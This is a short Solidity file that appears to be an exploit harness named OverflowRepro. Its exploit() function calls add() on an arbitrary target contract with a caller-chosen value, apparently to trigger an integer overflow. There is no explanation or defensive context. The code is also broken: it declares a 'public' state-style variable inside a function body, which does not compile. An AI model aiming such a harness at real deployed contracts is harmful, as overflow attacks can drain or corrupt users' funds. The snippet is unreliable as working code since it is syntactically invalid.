interface IOverflow {
    function add(uint value) external returns (bool);
}

contract OverflowRepro {
    function exploit(uint value,address _target ) public {
        IOverflow public target;
        target = IOverflow(_target);
        target.add(value);
    }
}